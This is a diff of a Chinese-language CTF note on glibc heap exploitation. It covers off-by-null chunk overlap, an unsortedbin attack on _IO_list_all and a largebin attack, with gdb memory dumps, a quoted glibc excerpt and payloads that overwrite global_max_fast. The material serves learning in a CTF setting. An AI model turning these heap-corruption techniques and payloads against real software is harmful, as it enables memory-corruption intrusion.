@@ -1,51 +1,53 @@
 # The Method of Heap Use In CTF #
 本篇文章的目的旨在对堆的一些使用方法和技巧进行总结，会不定期的更新。
 ## 1. off by null ##
-以 **sctf2018 bufoverflow\_a** 题目为例，off by null的最终目的是为了完成chunk overlap，从而可以对其中的某些chunk内容进行改写。
+以 **SCTF 2018 bufoverflow\_a** 题目为例，off by null的最终目的是为了完成chunk overlap，从而可以对其中的某些chunk内容进行改写。
 ### 利用方法1： ###
 通过改写下一个chunk的size字段，从而将原空闲chunk的大小缩小。  
 例如如下所示代码：
-  
+<pre class="prettyprint lang-javascript">
 	Alloc(0x88)		#0
 	Alloc(0x400)	#1
 	Alloc(0x110)	#2
 	Alloc(0x88)		#3
-
+	
 	Delete(0)
 	Delete(1)
 	Alloc(0x88)		#0
-	Fill("a"*0x88)	//假设Fill函数中存在off by null漏洞，会多写一个"\x0"
+	Fill("a"*0x88)	//假设Fill函数中存在off by null漏洞，会多写一个"\x00"
+</pre>
 此时，我们可以看看对于chunk1 的头部字段，Fill()函数执行前后的变化情况。  
-	
+<pre class="prettyprint lang-javascript">
 	Fill()前
-	0x0000000000000000	0x0000000000000091		<--chunk0
+	0x0000000000000000  0x0000000000000091		<--chunk0
 	......................................
 	......................................
-	0x0000000000000000	0x0000000000000000
-	0x0000000000000000	0x0000000000000411		<--chunk1
+	0x0000000000000000  0x0000000000000000
+	0x0000000000000000  0x0000000000000411		<--chunk1
 	......................................
 	......................................
-	0x0000000000000410	0x0000000000000110		<--chunk2	
+	0x0000000000000410  0x0000000000000110		<--chunk2	
 	
 	Fill()后
-	0x0000000000000000	0x0000000000000091		<--chunk0
+	0x0000000000000000  0x0000000000000091		<--chunk0
 	......................................
 	......................................
-	0x6161616161616161	0x6161616161616161
-	0x6161616161616161	0x0000000000000400		<--chunk1
+	0x6161616161616161  0x6161616161616161
+	0x6161616161616161  0x0000000000000400		<--chunk1
 	......................................
 	......................................
-	0x0000000000000410	0x0000000000000110		<--chunk2		
-			
+	0x0000000000000410  0x0000000000000110		<--chunk2		
+</pre>
 可以看到，chunk1的大小减少了0x10byte。然后再次进行chunk的申请。  
-	
+<pre class="prettyprint lang-javascript">
 	Alloc(0x88)		#1
 	Alloc(0x88)		#4
 	Alloc(0x200)	#5
 	Alloc(0xc8)		#6
+</pre>
 新申请的chunk1\_new，chunk4，chunk5，chunk6会占用之前chunk1\_old（大小为0x400）的位置。  
 实际动态调试结果如下图所示：  
-
+<pre class="prettyprint lang-javascript">
 	0x5555557580b0:	0x6161616161616161	0x0000000000000091		<--chunk1
 	0x5555557580c0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
 	0x5555557580d0:	0xcccccccccccccccc	0xcccccccccccccccc
@@ -73,14 +75,15 @@
 	0x5555557584b0:	0x0000000000000000	0xcccccccccccccccd
 	0x5555557584c0:	0x0000000000000410	0x0000000000000110		<--chunk2
 	0x5555557584d0:	0x0000000000000000	0x0000000000000000
-
+</pre>
 此时将chunk1\_new释放，再将chunk2释放。  
-
+<pre class="prettyprint lang-javascript">
 	Delete(1)
 	Delete(2)
 	Delete(5)
+</pre>
 由于chunk2的presize字段的值仍为0x410，且其pre\_inuse为0（表示上一个块也处于释放状态）。释放chunk2会出发前向合并，形成一个包含chunk1，chunk4，chunk5，chunk6和chunk2的大块，如下图所示：
-
+<pre class="prettyprint lang-javascript">
 	gdb-peda$ x/150gx 0x5555557580c0-0x10
 	0x5555557580b0:	0x6161616161616161	0x0000000000000521		<--原chunk1
 	0x5555557580c0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
@@ -112,7 +115,7 @@
 	0x5555557584e0:	0xcccccccccccccccc	0xcccccccccccccccc
 	0x5555557584f0:	0xcccccccccccccccc	0xcccccccccccccccc
 
-
+</pre>
 ### 利用方法2： ###
 
 
@@ -169,16 +172,76 @@
 
 其中0x7ffff7dd2510就为\_IO\_list\_all地址-0x10，然后再次申请一个大小小于0x60的chunk，则会将该chunk从unsortedbin链表上拆下，触发unsortedbin attack。  
 
-由于触发unsortedbin attack后程序会直接崩溃，无法截图，下面手动画一下触发后，堆块的相关布局情况。  
+由于触发unsortedbin attack后程序会直接崩溃（原因是继续遍历下一个unsortedbin chunk时，由于size字段不满足要求，所以触发了malloc\_printerr），无法截图，下面手动画一下触发后，堆块的相关布局情况。  
 
-main\_arena中相关字段：  
-unsorted bin（bin0的fd，bk字段）  
+<pre class="prettyprint lang-javascript">
+main_arena中的unsorted bin（bin[0]的fd，bk字段）  
 0x7ffff7dd1b88:		0x0000000000603350(fd)	0x00007ffff7dd2510(bk)  
-\_IO\_list\_all字段：  
-0x7ffff7dd2510:		0x0000000000000000		0x0000000000000000(size)  
-0x7ffff7dd2520:		0x00007ffff7dd1b78(fd)	0x0000000000000000(bk)  
 
-可以看到，成功将\_IO\_list\_all字段修改为了main\_arena中topchunk字段的地址。之后的利用内容就属于FSOP，这里不再赘述。
+_IO_list_all字段：  
+0x7ffff7dd2510:		0x0000000000000000	0x0000000000000000(size)  
+0x7ffff7dd2520:		0x00007ffff7dd1b78(fd)	0x0000000000000000(bk)  
+</pre>
+可以看到，成功将\_IO\_list\_all字段修改为了main\_arena中topchunk字段的地址。之后的利用内容就属于FSOP。
+
+## 3.Largebin Attack ##
+还是借助例题 SCTF2018  bufoverflow\_a 介绍Largebinbin Attack的相关利用。
+
+如果当前在largebin链表中有一个chunk，且程序存在漏洞能够修改该largebin chunk的内容，那么可以按照下述步骤触发largebin attack。
+
+存在漏洞利用点的代码片段：  
+<pre class="prettyprint lang-javascript">
+else
+{
+	assert (chunk_main_arena (fwd));
+	while ((unsigned long) size < chunksize_nomask (fwd))
+	{
+		fwd = fwd->fd_nextsize;
+		assert (chunk_main_arena (fwd));
+	}
+	//遍历链表，寻找小于等于victim的chunk
+	if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))	/* Always insert in the second position.  */
+		fwd = fwd->fd;	
+		//在largebin链表中发现已经有该大小的chunk，因此不再将victim chunk链入fd_nextsize和bk_nextsize组成的链表中
+	else
+	{
+		victim->fd_nextsize = fwd;
+		victim->bk_nextsize = fwd->bk_nextsize;		//method1 关键语句
+		fwd->bk_nextsize = victim;
+		victim->bk_nextsize->fd_nextsize = victim;		//method1 关键语句
+		//将victim chunk链入fd_nextsize和bk_nextsize组成的链表中
+	}
+	bck = fwd->bk;		//method2 关键语句
+}
+
+mark_bin (av, victim_index);
+victim->bk = bck;
+victim->fd = fwd;
+fwd->bk = victim;
+bck->fd = victim;		//method2 关键语句
+
+</pre>
+LargeBin Attack利用关键步骤：  
+1. 申请一个largebin chunk A  
+2. 释放 chunk A  
+3. 此时 chunk A 位于 unsortedbin中 ，再次申请一个size大于 chunk A 的 chunk B（保证chunk B大小与chunk A位于同一个largebin区间内），使得 chunk A 无法满足分配要求而被从unsortedbin中取下，放入到对应的largebin链表中  
+4. 利用程序漏洞修改 chunk A 的 bk\_nextsize字段（使其等于要修改内容地址-0x20），或者修改 chunk A 的bk字段（使其等于要修改内容地址-0x10）  
+5. 释放 chunk B，触发largebin attack
+
+如步骤4所示，利用largebin attack的方式一种有两种，两种修改方式都能将修改地址的内容替换为victim的地址。同时，还有一个需要注意的点就是：在使用第一种方法修改bk\_nextsize字段时，还需要将bk字段也修改为一个可写地址。如果采用第二种方式修改bk字段，那么就需要将bk\_nextsize字段修改为一个可写地址。
+
+以bufoverflow\_a为例，修改的largebin chunk如下代码所示：
+<pre class="prettyprint lang-javascript">
+#method 1:
+payload = 'a'*0xf0
+payload += p64(0) + p64(0x501) + p64(0) + p64(heap_addr) + p64(0) + p64(global_max_fast-0x20)
+payload += 'A'*(0x4f0-0x20)+p64(0x21)*8
+
+#method 2:
+payload = 'a'*0xf0
+payload += p64(0) + p64(0x501) + p64(0) + p64(global_max_fast-0x10) + p64(0) + p64(heap_addr)
+payload += 'A'*(0x4f0-0x20)+p64(0x21)*8
+</pre>
 
 
 
